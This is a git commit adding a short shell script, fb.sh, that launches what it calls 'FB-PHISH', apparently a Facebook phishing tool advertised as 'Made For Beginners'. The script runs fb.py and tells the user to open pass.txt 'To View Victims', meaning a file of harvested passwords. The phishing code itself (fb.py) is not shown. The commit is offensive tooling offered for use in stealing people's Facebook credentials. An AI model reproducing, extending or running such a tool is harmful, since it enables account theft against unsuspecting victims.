9ed0da45673b6d2b8341e3efd41b82ef058a5097
nerdhacker000 <114361549+nerdhacker000@users.noreply.github.com>
2022-09-25 21:00:04 +0000

    Update 1.0

---
+++ fb.sh
@@ -0,0 +1,9 @@
+clear
+echo "FB-PHISH STARTED..."
+echo
+echo "Tool By nerdhacker000 On Github, Made For Beginners"
+echo "Type \'1\' To Begin Process"
+read opt_ion
+python fb.py
+echo
+echo "TYPE \'nano pass.txt\' To View Victims"
